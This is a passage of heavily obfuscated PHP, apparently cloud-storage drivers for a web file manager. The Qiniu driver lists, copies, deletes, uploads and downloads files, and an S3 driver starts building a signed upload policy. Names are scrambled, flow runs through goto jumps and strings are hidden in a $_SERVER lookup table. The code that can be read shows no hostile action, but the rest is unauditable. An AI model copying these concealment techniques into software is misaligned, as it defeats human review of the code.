$this->getPathOuter($d™¡Ñ÷â∏); goto E∂ÎôüÔ•‚; EÍ≈÷èıáı: $CÑØæ€ñ´º =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d™¡Ñ÷â∏ = trim($Eó„ÇçﬁÆº, $CÑØæ€ñ´º[8]); if ($this->_isFolder($d™¡Ñ÷â∏)) { return $this->getPathOuter($d™¡Ñ÷â∏); } goto bÎÈ«òÕãπ; E∂ÎôüÔ•‚: } public function copyFile($DÛß”£»Ê‚, $bâî ∑≠ª) { $eïÌåÇ¢‡ö = $this->bucketManager->copy($this->bucket, $DÛß”£»Ê‚, $this->bucket, $bâî ∑≠ª, !0); return $eïÌåÇ¢‡ö ? !1 : !0; } public function moveFile($a‘Êáî∫àÙ, $CÊõÇÙ˜áÁ) { $a≥€•Û‚ã¢ = $this->bucketManager->move($this->bucket, $a‘Êáî∫àÙ, $this->bucket, $CÊõÇÙ˜áÁ, !0); return $a≥€•Û‚ã¢ ? !1 : !0; } public function delFile($FûÒ ≠ãº˜) { $E·Á–ñ…æÂ = $this->bucketManager->delete($this->bucket, $FûÒ ≠ãº˜); return $E·Á–ñ…æÂ ? !1 : !0; } public function delFolder($dÙ¡®ù–Ùå) { $dÿÚ£ò§Òò = $this->fileList($dÙ¡®ù–Ùå); if (empty($dÿÚ£ò§Òò)) { return !0; } $b€œîîëóï = 1000; if (count($dÿÚ£ò§Òò) <= $b€œîîëóï) { return $this->qnDelObj($dÿÚ£ò§Òò) ? !1 : !0; } foreach (array_chunk($dÿÚ£ò§Òò, $b€œîîëóï) as $Cø≥¿ ã—Ø) { $AŒü¢Õ‰ºï = $this->qnDelObj($Cø≥¿ ã—Ø); if ($AŒü¢Õ‰ºï) { return !1; } } return !0; } private function qnDelObj($E¯Ì´£¬≤Ü) { $B†ÙäÜñŒ™ = $this->bucketManager->buildBatchDelete($this->bucket, $E¯Ì´£¬≤Ü); list($fÉ‘ÿ§ÚÂŒ, $Fƒ›∏îÈÈ¿) = $this->bucketManager->batch($B†ÙäÜñŒ™); return $Fƒ›∏îÈÈ¿; } private function fileList($E ¶Ç˜∂ÃÈ, $e—´≤ê‚— = 0) { goto c∂≤ó¥⁄æ¡; AºÕ€çÚ•Û: $A◊—»⁄®é¬ = $e∂™ÎÃ¿”ê[33]; $C§≈ÚãëÈ« = 1000; $D•å—Ú∑Ç = $e∂™ÎÃ¿”ê[33]; goto bÁ´âÿÙæ; c∂≤ó¥⁄æ¡: $e∂™ÎÃ¿”ê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E ¶Ç˜∂ÃÈ = trim($E ¶Ç˜∂ÃÈ, $e∂™ÎÃ¿”ê[8]); $b∞„Û ó›é = empty($E ¶Ç˜∂ÃÈ) ? $e∂™ÎÃ¿”ê[33] : $E ¶Ç˜∂ÃÈ . $e∂™ÎÃ¿”ê[8]; goto AºÕ€çÚ•Û; bÁ´âÿÙæ: $Cê∆à¢–˜Ù = array(); while (!0) { list($E˘åƒ¡Ïßâ, $b€¶ÀÙÌñî) = $this->bucketManager->listFiles($this->bucket, $b∞„Û ó›é, $A◊—»⁄®é¬, $C§≈ÚãëÈ«, $D•å—Ú∑Ç); if ($b€¶ÀÙÌñî) { return !1; } $A◊—»⁄®é¬ = array_key_exists($e∂™ÎÃ¿”ê[1186], $E˘åƒ¡Ïßâ) ? $A◊—»⁄®é¬ = $E˘åƒ¡Ïßâ[$e∂™ÎÃ¿”ê[1217]] : $e∂™ÎÃ¿”ê[33]; foreach ($E˘åƒ¡Ïßâ[$e∂™ÎÃ¿”ê[1218]] as $EøÜ‚éœ÷Œ) { $c ÖÌÛÔÀ§ = $EøÜ‚éœ÷Œ[$e∂™ÎÃ¿”ê[89]]; if ($e—´≤ê‚—) { $c ÖÌÛÔÀ§ = array($e∂™ÎÃ¿”ê[28] => $c ÖÌÛÔÀ§, $e∂™ÎÃ¿”ê[77] => $EøÜ‚éœ÷Œ[$e∂™ÎÃ¿”ê[1219]]); } $Cê∆à¢–˜Ù[] = $c ÖÌÛÔÀ§; } if ($A◊—»⁄®é¬ == $e∂™ÎÃ¿”ê[33]) { break; } } return $Cê∆à¢–˜Ù; goto Döı¢¯“‡∂; Döı¢¯“‡∂: } public function rename($båçŒ¬íãÉ, $F„âÏçÒó’) { return $this->renameObject($båçŒ¬íãÉ, $F„âÏçÒó’); } public function fileInfo($cü´ïíåÌÎ, $FÔç†í«¥Ó = false, $D∂⁄ºÂâè⁄ = array()) { goto fŸ©ÿ¶è⁄©; BüÃ¨ÿÕùœ: if (empty($D∂⁄ºÂâè⁄)) { $D∂⁄ºÂâè⁄ = $this->objectMeta($cü´ïíåÌÎ); if (!$D∂⁄ºÂâè⁄) { return $C°Îí™…åÀ; } } if (isset($D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1220]])) { $C°Îí™…åÀ[$bïãÎ®©ò≥[187]] = $D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1220]]; } if (isset($D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1219]])) { $C°Îí™…åÀ[$bïãÎ®©ò≥[77]] = $D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1219]]; } goto e∏¡¯ÈËáÒ; fŸ©ÿ¶è⁄©: $bïãÎ®©ò≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($FÔç†í«¥Ó) { return array($bïãÎ®©ò≥[28] => $this->pathThis($cü´ïíåÌÎ), $bïãÎ®©ò≥[75] => $this->getPathOuter($bïãÎ®©ò≥[8] . $cü´ïíåÌÎ), $bïãÎ®©ò≥[29] => $bïãÎ®©ò≥[167], $bïãÎ®©ò≥[77] => isset($D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1219]]) ? $D∂⁄ºÂâè⁄[$bïãÎ®©ò≥[1219]] : 0, $bïãÎ®©ò≥[160] => $this->ext($cü´ïíåÌÎ)); } $C°Îí™…åÀ = array($bïãÎ®©ò≥[28] => $this->pathThis($cü´ïíåÌÎ), $bïãÎ®©ò≥[75] => $this->getPathOuter($bïãÎ®©ò≥[8] . $cü´ïíåÌÎ), $bïãÎ®©ò≥[29] => $bïãÎ®©ò≥[167], $bïãÎ®©ò≥[187] => 0, $bïãÎ®©ò≥[107] => 0, $bïãÎ®©ò≥[77] => 0, $bïãÎ®©ò≥[160] => $this->ext($cü´ïíåÌÎ), $bïãÎ®©ò≥[188] => !0, $bïãÎ®©ò≥[189] => !0); goto BüÃ¨ÿÕùœ; e∏¡¯ÈËáÒ: return $C°Îí™…åÀ; goto C€ÁﬁÛÙ⁄; C€ÁﬁÛÙ⁄: } public function folderInfo($fÁëèàî¶å, $Bà≠¿≠áé¢ = false) { goto F◊—é±¯˘◊; F°ïÉÏ∆¶ı: return $fÃ©¯àê®á; goto aá¿û˘º£–; F◊—é±¯˘◊: $FÖØˆ—Ü–Ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($Bà≠¿≠áé¢) { return array($FÖØˆ—Ü–Ø[28] => $this->pathThis($fÁëèàî¶å), $FÖØˆ—Ü–Ø[75] => $this->getPathOuter($FÖØˆ—Ü–Ø[8] . $fÁëèàî¶å), $FÖØˆ—Ü–Ø[29] => $FÖØˆ—Ü–Ø[76]); } $fÃ©¯àê®á = array($FÖØˆ—Ü–Ø[28] => $this->pathThis($fÁëèàî¶å), $FÖØˆ—Ü–Ø[75] => $this->getPathOuter($FÖØˆ—Ü–Ø[8] . $fÁëèàî¶å), $FÖØˆ—Ü–Ø[29] => $FÖØˆ—Ü–Ø[76], $FÖØˆ—Ü–Ø[187] => 0, $FÖØˆ—Ü–Ø[107] => 0, $FÖØˆ—Ü–Ø[1165] => !0, $FÖØˆ—Ü–Ø[1166] => !0); goto bâä»÷ó¡É; bâä»÷ó¡É: $fÁëèàî¶å = rtrim($fÁëèàî¶å, $FÖØˆ—Ü–Ø[8]) . $FÖØˆ—Ü–Ø[8]; $FÉ€…§»áë = $this->objectMeta($fÁëèàî¶å); if (isset($FÉ€…§»áë[$FÖØˆ—Ü–Ø[1220]])) { $fÃ©¯àê®á[$FÖØˆ—Ü–Ø[187]] = $FÉ€…§»áë[$FÖØˆ—Ü–Ø[1220]]; } goto F°ïÉÏ∆¶ı; aá¿û˘º£–: } public function listPath($eâÎÚ£≤´≥, $E∑≠ê∆∫ΩÔ = false) { goto CæıüŸ¶Ï¿; cñåÊ¥…äŒ: $fÈŒ‚…ö°ª = $C¶Üõ–é™æ = array(); while (!0) { list($DúáÑ≈Îî⁄, $cî∑Ü‹üüÈ) = $this->bucketManager->listFiles($this->bucket, $E›è ƒ≥ ∂, $d™á‡®˘Ò¡, $d˜Õ°çü¢û, $FÑﬁÃÁ‡ÉÑ); if ($cî∑Ü‹üüÈ) { return !1; } $d™á‡®˘Ò¡ = array_key_exists($Fƒï©ˆ‘ëò[1186], $DúáÑ≈Îî⁄) ? $d™á‡®˘Ò¡ = $DúáÑ≈Îî⁄[$Fƒï©ˆ‘ëò[1217]] : $Fƒï©ˆ‘ëò[33]; if (isset($DúáÑ≈Îî⁄[$Fƒï©ˆ‘ëò[1221]])) { foreach ($DúáÑ≈Îî⁄[$Fƒï©ˆ‘ëò[1221]] as $e•¶˜‘‘àó) { if ($e•¶˜‘‘àó == $E›è ƒ≥ ∂) { continue; } $fÈŒ‚…ö°ª[] = $this->folderInfo($e•¶˜‘‘àó, $E∑≠ê∆∫ΩÔ); } } if (isset($DúáÑ≈Îî⁄[$Fƒï©ˆ‘ëò[1218]])) { foreach ($DúáÑ≈Îî⁄[$Fƒï©ˆ‘ëò[1218]] as $D≈≥¥Àèƒ√) { if ($D≈≥¥Àèƒ√[$Fƒï©ˆ‘ëò[89]] == $E›è ƒ≥ ∂) { continue; } $C¶Üõ–é™æ[] = $this->fileInfo($D≈≥¥Àèƒ√[$Fƒï©ˆ‘ëò[89]], $E∑≠ê∆∫ΩÔ, $D≈≥¥Àèƒ√); } } if ($d™á‡®˘Ò¡ == $Fƒï©ˆ‘ëò[33]) { break; } } return array($Fƒï©ˆ‘ëò[74] => $fÈŒ‚…ö°ª, $Fƒï©ˆ‘ëò[73] => $C¶Üõ–é™æ); goto EßâœÉƒØà; CæıüŸ¶Ï¿: $Fƒï©ˆ‘ëò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eâÎÚ£≤´≥ = trim($eâÎÚ£≤´≥, $Fƒï©ˆ‘ëò[8]); $E›è ƒ≥ ∂ = empty($eâÎÚ£≤´≥) ? $Fƒï©ˆ‘ëò[33] : $eâÎÚ£≤´≥ . $Fƒï©ˆ‘ëò[8]; goto bƒ¶ËÑ≤œ„; bƒ¶ËÑ≤œ„: $d™á‡®˘Ò¡ = $Fƒï©ˆ‘ëò[33]; $d˜Õ°çü¢û = 1000; $FÑﬁÃÁ‡ÉÑ = $Fƒï©ˆ‘ëò[8]; goto cñåÊ¥…äŒ; EßâœÉƒØà: } public function has($Dë≤”È¶»‹, $eéÃû’è≠È = false, $EŸ’áŒÉΩæ = true) { goto EÊâÙàó¥é; EÊâÙàó¥é: $AÒ—«å˘îﬂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dë≤”È¶»‹ = trim($Dë≤”È¶»‹, $AÒ—«å˘îﬂ[8]); $b’àÂÆÀÊµ = empty($Dë≤”È¶»‹) ? $AÒ—«å˘îﬂ[33] : $Dë≤”È¶»‹ . $AÒ—«å˘îﬂ[8]; goto e‡ßß¯˘ë€; EåˆæÜäÀ: $d∆êµß∑¬Ç = 0; $fÀÇñ∆ô≈é = 0; while (!0) { list($b¢©üÒıùß, $b¯›ÑÕ‡°‡) = $this->bucketManager->listFiles($this->bucket, $b’àÂÆÀÊµ, $cÕçº˜Ãıò, $E‰µÂÑÛÇÈ, $Eë¶ °◊úÔ); if ($b¯›ÑÕ‡°‡) { return !1; } $cÕçº˜Ãıò = array_key_exists($AÒ—«å˘îﬂ[1186], $b¢©üÒıùß) ? $cÕçº˜Ãıò = $b¢©üÒıùß[$AÒ—«å˘îﬂ[1217]] : $AÒ—«å˘îﬂ[33]; if ($eéÃû’è≠È) { if (!empty($b¢©üÒıùß[$AÒ—«å˘îﬂ[1218]])) { $d∆êµß∑¬Ç += count($b¢©üÒıùß[$AÒ—«å˘îﬂ[1218]]); } if (!empty($b¢©üÒıùß[$AÒ—«å˘îﬂ[1221]])) { $fÀÇñ∆ô≈é += count($b¢©üÒıùß[$AÒ—«å˘îﬂ[1221]]); } if ($cÕçº˜Ãıò === $AÒ—«å˘îﬂ[33]) { break; } continue; } if ($EŸ’áŒÉΩæ) { if (!empty($b¢©üÒıùß[$AÒ—«å˘îﬂ[1218]])) { return !0; } } else { if (!empty($b¢©üÒıùß[$AÒ—«å˘îﬂ[1221]])) { return !0; } } if ($cÕçº˜Ãıò == $AÒ—«å˘îﬂ[33]) { break; } } goto EÃÉÿ‚¡∏˘; EÃÉÿ‚¡∏˘: if ($eéÃû’è≠È) { return array($AÒ—«å˘îﬂ[191] => $d∆êµß∑¬Ç, $AÒ—«å˘îﬂ[192] => $fÀÇñ∆ô≈é); } return !1; goto eÒÀ≈ÙÁÔÛ; e‡ßß¯˘ë€: $cÕçº˜Ãıò = $AÒ—«å˘îﬂ[33]; $E‰µÂÑÛÇÈ = 1000; $Eë¶ °◊úÔ = $AÒ—«å˘îﬂ[8]; goto EåˆæÜäÀ; eÒÀ≈ÙÁÔÛ: } public function listAll($Fßä¥¶ä˘) { $eÒ¯÷⁄’É≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F±ª∑àéÍÉ = $this->fileList($Fßä¥¶ä˘, 1); $d¨ê„èë·ç = array(); foreach ($F±ª∑àéÍÉ as $bº®ûÓ£Ü‚) { $d¨ê„èë·ç[$bº®ûÓ£Ü‚[$eÒ¯÷⁄’É≥[28]]] = $bº®ûÓ£Ü‚[$eÒ¯÷⁄’É≥[77]]; } return $this->listAllFiles($Fßä¥¶ä˘, array_keys($d¨ê„èë·ç), $d¨ê„èë·ç); } public function canRead($c∂´≠ªü∞ø) { return $this->exist($c∂´≠ªü∞ø) ? !0 : !1; } public function canWrite($dÉÛ˘›ÈôÃ) { return $this->exist($dÉÛ˘›ÈôÃ) ? !0 : !1; } public function getContent($A√¢£Ë¬Ô¢) { return $this->fileSubstr($A√¢£Ë¬Ô¢, 0, -1); } public function setContent($fÃıŒö®Í¯, $e•Ò†ëÏëÛ = '') { $Cê ∆®Ã´ä = $this->tempFile($this->pathThis($fÃıŒö®Í¯)); file_put_contents($Cê ∆®Ã´ä, $e•Ò†ëÏëÛ); if ($this->upload($fÃıŒö®Í¯, $Cê ∆®Ã´ä)) { $this->tempFileRemve($Cê ∆®Ã´ä); return !0; } return !1; } public function refreshUrls($BÃ™Õ¶’∑ç) { goto eìï¢™ﬂÌÂ; eìï¢™ﬂÌÂ: $FƒÏÈ¿¡≤á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c ä⁄∏∂Î§ = array(); if (is_array($BÃ™Õ¶’∑ç)) { foreach ($BÃ™Õ¶’∑ç as $CÉŒïà†Ê) { $c ä⁄∏∂Î§[] = $this->link($CÉŒïà†Ê); } } else { $c ä⁄∏∂Î§[] = $this->link($BÃ™Õ¶’∑ç); } goto BÖ“º∫’ø¥; BÖ“º∫’ø¥: $fﬁ°üçôê± = new Qiniu\Cdn\CdnManager($this->auth); list($f–Õà¡Á†·, $fâ˘ﬂ‰Á¶ô) = $fﬁ°üçôê±->refreshUrls($c ä⁄∏∂Î§); if ($fâ˘ﬂ‰Á¶ô) { return !1; } goto Dä“ä‹Úû¬; Dä“ä‹Úû¬: return $f–Õà¡Á†·[$FƒÏÈ¿¡≤á[1222]] == $FƒÏÈ¿¡≤á[696] ? !0 : !1; goto cÓΩÜ„Èﬁ—; cÓΩÜ„Èﬁ—: } public function fileSubstr($C§Öãéô©∂, $bå÷íùñƒÊ, $bÊàã≠åîÌ) { $Cºß—Üáö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!($c—ö⁄ÛÇî = $this->link($C§Öãéô©∂))) { return !1; } $Eƒùó¥∆ã‹ = !1; if ($bÊàã≠åîÌ > 0) { $F•îÇ¯’âá = $bå÷íùñƒÊ + $bÊàã≠åîÌ - 1; $Eƒùó¥∆ã‹ = array($Cºß—Üáö[1223] . $bå÷íùñƒÊ . $Cºß—Üáö[412] . $F•îÇ¯’âá); } $CÁ≥‹†çõâ = url_request($c—ö⁄ÛÇî, $Cºß—Üáö[216], !1, $Eƒùó¥∆ã‹); return $CÁ≥‹†çõâ[$Cºß—Üáö[689]] ? $CÁ≥‹†çõâ[$Cºß—Üáö[1038]] : !1; } public function upload($D—·ƒìå⁄à, $A¡‹ÿóÜéº, $FÓà«ç∏´÷ = false, $CÜŸÓ•†¶Ó = REPEAT_REPLACE) { $CÁá±™ñ‰Ê = new Qiniu\Storage\UploadManager(); $Dã™úóª∂∏ = $this->auth->uploadToken($this->bucket, $D—·ƒìå⁄à); $DΩÊŸﬂªÚ∂ = get_file_mime(get_path_ext($A¡‹ÿóÜéº)); list($e£Î≤∂çÍç, $Aû¯äÕñàî) = $CÁá±™ñ‰Ê->putFile($Dã™úóª∂∏, $D—·ƒìå⁄à, $A¡‹ÿóÜéº, null, $DΩÊŸﬂªÚ∂); return $Aû¯äÕñàî ? !1 : $this->getPathOuter($D—·ƒìå⁄à); } public function uploadFormData($EıàæÂá¨„, $DÁ£Âá‡¢ã = 3600) { return $this->uploadToken($EıàæÂá¨„, $DÁ£Âá‡¢ã); } public function multiUploadFormData($D¡†Ëò˜‘¯, $Fã©„åë≈Ñ = 3600) { return $this->uploadToken($D¡†Ëò˜‘¯, $Fã©„åë≈Ñ); } private function uploadToken($c•ø™˜‚»‡, $Eﬁ‡¯Ü∞Çû = 3600) { goto BÙäúä¶Ùß; dîÖﬂë¥öª: $A∏ûÍâ†Òà = http_type() . "\72\x2f\x2f\x75\x70\154\157\x61\x64{$Bêáó∆√…ö}\56\161\x69\156\151\165\160\x2e\x63\x6f\x6d\x2f"; return array($Bü¯é—ë«‹[1227] => $DëÉõ°–ÃÙ, $Bü¯é—ë«‹[1228] => $A∏ûÍâ†Òà); goto Eà∞Á«‰Ú€; BÙäúä¶Ùß: $Bü¯é—ë«‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F∂• è”Òã = $Eﬁ‡¯Ü∞Çû; $b•√œÁñõ… = array($Bü¯é—ë«‹[1224] => $Bü¯é—ë«‹[1225]); goto Bëâ–≤ä°·; Bëâ–≤ä°·: $f∏è∑–á◊¶ = null; $DëÉõ°–ÃÙ = $this->auth->uploadToken($this->bucket, $f∏è∑–á◊¶, $F∂• è”Òã, $b•√œÁñõ…, !0); $Bêáó∆√…ö = empty($this->region) || $this->region == $Bü¯é—ë«‹[1226] ? $Bü¯é—ë«‹[33] : $Bü¯é—ë«‹[412] . $this->region; goto dîÖﬂë¥öª; Eà∞Á«‰Ú€: } public function download($aΩßé˘“îü, $b„ˆü„•µø) { goto câÇùΩ≥Àî; aè‡Áó°„¡: fclose($fÌ∂“¿ƒîñ); return $b„ˆü„•µø; goto bÆú√Ê∏∆•; câÇùΩ≥Àî: $c≠Ùé»éãâ = IO::getPathInner(IO::mkfile($b„ˆü„•µø)); if (!($Fê€“◊©åÂ = $this->link($aΩßé˘“îü))) { return !1; } $eËçıèÔì« = 0; goto BÒÒ§Çâ¡Ñ; BÒÒ§Çâ¡Ñ: $f°÷ùÉë´∆ = 1024 * 200; $fÌ∂“¿ƒîñ = fopen($c≠Ùé»éãâ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1229]); while (!0) { $EÃßÖÙã≥ì = $this->fileSubstr($aΩßé˘“îü, $eËçıèÔì«, $f°÷ùÉë´∆); if ($EÃßÖÙã≥ì === !1) { return !1; } fwrite($fÌ∂“¿ƒîñ, $EÃßÖÙã≥ì); $eËçıèÔì« += $f°÷ùÉë´∆; if (strlen($EÃßÖÙã≥ì) < $f°÷ùÉë´∆) { break; } } goto aè‡Áó°„¡; bÆú√Ê∏∆•: } public function link($d…™ó¡Â å, $B´ªœÀ◊€∏ = '') { if (!$this->isFile($d…™ó¡Â å)) { return !1; } $bŸ„´—øﬁÜ = $this->getHost() . $_SERVER[Ä¿¡‡öóµŸﬂ‡][8] . $this->pathEncode($d…™ó¡Â å) . $B´ªœÀ◊€∏; return $this->auth->privateDownloadUrl($bŸ„´—øﬁÜ, 3600 * 12); } public function fileOut($cÑ≈È÷‘‹·, $Bí·Ö…Ì—Ü = false, $Fˆóåªî¬¨ = false, $fï∑Ë›πáù = '') { $c⁄Íå„´å± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$Fˆóåªî¬¨) { $Fˆóåªî¬¨ = $this->pathThis($cÑ≈È÷‘‹·); } $C“Í≠√Øçœ = $Bí·Ö…Ì—Ü ? $c⁄Íå„´å±[1230] . rawurlencode($Fˆóåªî¬¨) : $c⁄Íå„´å±[33]; $C§§∆∞óöó = $this->link($cÑ≈È÷‘‹·, $C“Í≠√Øçœ); $this->fileOutLink($C§§∆∞óöó); } public function fileOutServer($FÇÊ”›Ò™Ë, $fæõ–ªÑ©œ = false, $fó–Ïé…¡û = false, $B‹É∞ïä·ã = '') { parent::fileOut($FÇÊ”›Ò™Ë, $fæõ–ªÑ©œ, $fó–Ïé…¡û, $B‹É∞ïä·ã); } public function fileOutImage($cÏ§Óî¬úÜ, $e¥ÇÓ˘°â´ = 250) { $FÁ”ﬂÇÆ‰• = $this->link($cÏ§Óî¬úÜ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1231] . $e¥ÇÓ˘°â´); $this->fileOutLink($FÁ”ﬂÇÆ‰•); } public function fileOutImageServer($C≠≈Íªû‡û, $BÊπ”éÊüı = 250) { parent::fileOutImage($C≠≈Íªû‡û, $BÊπ”éÊüı); } public function hashMd5($BÜÛÛë„ˆ°) { $dÊÉ¶«êµ≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÑÂ©√–€‹ = $this->objectMeta($BÜÛÛë„ˆ°); return isset($aÑÂ©√–€‹[$dÊÉ¶«êµ≥[196]]) ? $aÑÂ©√–€‹[$dÊÉ¶«êµ≥[196]] : !1; $C† ÌàÈù∞ = $this->link($BÜÛÛë„ˆ°, $dÊÉ¶«êµ≥[1232]); } public function size($D∫“—æÁÜã) { $aÕãæëƒË = $this->objectMeta($D∫“—æÁÜã); return $aÕãæëƒË ? $aÕãæëƒË[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function info($cªœ»·ëÿõ) { if ($this->isFolder($cªœ»·ëÿõ)) { return $this->folderInfo($cªœ»·ëÿõ); } else { if ($this->isFile($cªœ»·ëÿõ)) { return $this->fileInfo($cªœ»·ëÿõ); } } return !1; } public function exist($aŸÆ…Ë∏ôΩ) { return $this->isFile($aŸÆ…Ë∏ôΩ) || $this->isFolder($aŸÆ…Ë∏ôΩ); } public function isFile($A©“Æë·ê™) { return !$this->isFolder($A©“Æë·ê™) && $this->objectMeta($A©“Æë·ê™); } public function isFolder($cÌ‡ﬂ˜©Ö∑) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][223], $cÌ‡ﬂ˜©Ö∑); } protected function objectMeta($FöåŒà∏Ïì) { return $this->cacheMethod($_SERVER[Ä¿¡‡öóµŸﬂ‡][224], $FöåŒà∏Ïì); } protected function _objectMeta($e°…ê”µëá) { $FÏ‡áòﬂˆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; list($Bª√‘ÿ∫°Á, $fÉ‹ÓîØ„Í) = $this->bucketManager->stat($this->bucket, $e°…ê”µëá); if ($Bª√‘ÿ∫°Á) { $Bª√‘ÿ∫°Á[$FÏ‡áòﬂˆ[77]] = intval($Bª√‘ÿ∫°Á[$FÏ‡áòﬂˆ[1219]]); } return $Bª√‘ÿ∫°Á; } protected function _isFolder($E—º±≥™áä) { $bÉ˜∫êÎÆæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; list($eÇ›©“è†ª, $Eà ∏®ÈÂá) = $this->bucketManager->listFiles($this->bucket, trim($E—º±≥™áä, $bÉ˜∫êÎÆæ[8]) . $bÉ˜∫êÎÆæ[8], $bÉ˜∫êÎÆæ[33], 1, $bÉ˜∫êÎÆæ[8]); return !empty($eÇ›©“è†ª[$bÉ˜∫êÎÆæ[1218]]) || !empty($eÇ›©“è†ª[$bÉ˜∫êÎÆæ[1221]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($aØ≤®ßôµÏ) { parent::__construct($aØ≤®ßôµÏ); } public function uploadFormData($d‚»ßë∏∑‰, $eƒÌΩºñ∆ˆ = 3600) { goto aÔ‰≈¯⁄ƒö; eæÖ•Í‹êë: $cˆ÷ûÃÂÇú = base64_encode(json_encode($d≠ºÚ«äõ´)); $EˆÆÕı’•ó = hash_hmac($eõ•·Ω“±˘[1147], $EÓÚ∑¯£Ö, $eõ•·Ω“±˘[1148] . $this->secret, !0); $Cπîê“Ôò« = hash_hmac($eõ•·Ω“±˘[1147], $this->region, $EˆÆÕı’•ó, !0); goto dı«Ïπáî…; C≠é⁄œ£Çì: $fæÛíê∆ß÷ = array($eõ•·Ω“±˘[199] => $eõ•·Ω“±˘[33], $eõ•·Ω“±˘[1149] => $eõ•·Ω“±˘[33], $eõ•·Ω“±˘[1108] => $d”áúÛÎ€‘, $eõ•·Ω“±˘[1112] => $D¨î⁄èÈæ¿, $eõ•·Ω“±˘[1116] => $cˆ÷ûÃÂÇú, $eõ•·Ω“±˘[1150] => $C˜øã‘öÑë, $eõ•·Ω“±˘[1151] => $aÇÎ¿¬•äñ, $eõ•·Ω“±˘[1152] => $E∑µ°¢πñì, $eõ•·Ω“±˘[1153] => $fü¬ıÊ‡≈∑, $eõ•·Ω“±˘[1154] => $FÖÒº¢÷Ÿï, $eõ•·Ω“±˘[169] => $this->getHost()); return $fæÛíê∆ß÷; goto BÙãõŒÔòÏ; aÔ‰≈¯⁄ƒö: $eõ•·Ω“±˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d”áúÛÎ€‘ = $eõ•·Ω“±˘[185]; $aÇÎ¿¬•äñ = $eõ•·Ω“±˘[1137]; goto FπÖﬁÊßÜ–; e Ôå…üß∞: $bÖˆÁÑ‡∏ = $eõ•·Ω“±˘[1139]; $fü¬ıÊ‡≈∑ = $eƒÌΩºñ∆ˆ . $eõ•·Ω“±˘[33]; $D¨î⁄èÈæ¿ = $eõ•·Ω“±˘[1104]; goto D—Ωª´∫Ÿè; FπÖﬁÊßÜ–: $Dºπ›Ö≤ãÌ = $eõ•·Ω“±˘[59]; $E∑µ°¢πñì = gmdate($eõ•·Ω“±˘[1138]); $EÓÚ∑¯£Ö = gmdate($eõ•·Ω“±˘[690]); goto e Ôå…üß∞; dı«Ïπáî…: $aÂ†úÕ«îÍ = hash_hmac($eõ•·Ω“±˘[1147], $Dºπ›Ö≤ãÌ, $Cπîê“Ôò«, !0); $b›Ó‰Ñ‚∂à = hash_hmac($eõ•·Ω“±˘[1147], $bÖˆÁÑ‡∏, $aÂ†úÕ«îÍ, !0); $FÖÒº¢÷Ÿï = hash_hmac($eõ•·Ω“±˘[1147], $cˆ÷ûÃÂÇú, $b›Ó‰Ñ‚∂à); goto C≠é⁄œ£Çì; D—Ωª´∫Ÿè: $AÑ…úÃøÁé = array($this->accessKey, $EÓÚ∑¯£Ö, $this->region, $Dºπ›Ö≤ãÌ, $bÖˆÁÑ‡∏); $C˜øã‘öÑë = implode($eõ•·Ω“±˘[8], $AÑ…úÃøÁé); $d≠ºÚ«äõ´ = array($eõ•·Ω“±˘[1106] => gmdate($eõ•·Ω“±˘[1105], strtotime($eõ•·Ω“±˘[1140])), $eõ•·Ω“±˘[1107] => array(array($eõ•·Ω“±˘[1109] => $this->bucket), array($eõ•·Ω“±˘[1108] => $d”áúÛÎ€‘), array($eõ•·Ω“±˘[1110], $eõ•·Ω“±˘[1111], $eõ•·Ω“±˘[33]), array($eõ•·Ω“±˘[1110], $eõ•·Ω“±˘[1141], $eõ•·Ω“±˘[33]), array($eõ•·Ω“±˘[1110], $eõ•·Ω“±˘[1142], $eõ•·Ω“±˘[33]), array($eõ•·Ω“±˘[1112] => $D¨î⁄èÈæ¿), array($eõ•·Ω“±˘[1143] => $C˜øã‘öÑë), array($eõ•·Ω“±˘[1144] => $aÇÎ¿¬•äñ), array($eõ•·Ω“±˘[1145] => $E∑µ°¢πñì), array($eõ•·Ω“±˘[1146] => $fü¬ıÊ‡≈∑))); goto eæÖ•Í‹êë; BÙãõŒÔòÏ: } public function multiUploadFormData($CÉ€¬¶Î⁄î, $B‹Ö†‚ﬁ å = 3600) { $Bì¡ª•¶àﬂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÏûé©¿Ωî = gmdate($Bì¡ª•¶àﬂ[1233]); $Aû¡≤£≥ÿä = array(); $b‡Ïû≥‹©Ú = $this->client->getUploadId($this->bucket, $CÉ€¬¶Î⁄î, $Aû¡≤£≥ÿä); if (!$b‡Ïû≥‹©Ú) { return !1; } return array($Bì¡ª•¶àﬂ[209] => $b‡Ïû≥‹©Ú, $Bì¡ª•¶àﬂ[169] => $this->getHost() . $Bì¡ª•¶àﬂ[8] . $this->pathEncode($CÉ€¬¶Î⁄î), $Bì¡ª•¶àﬂ[210] => $cÏûé©¿Ωî, $Bì¡ª•¶àﬂ[89] => $CÉ€¬¶Î⁄î); } public function multiUploadAuthData($FëıçÀã˜ü, $fë±¥Ò≈Õ‰ = array()) { goto EÖÑÎÔöÖë; EÖÑÎÔöÖë: $Aù–Ø‰∞£≥ =& 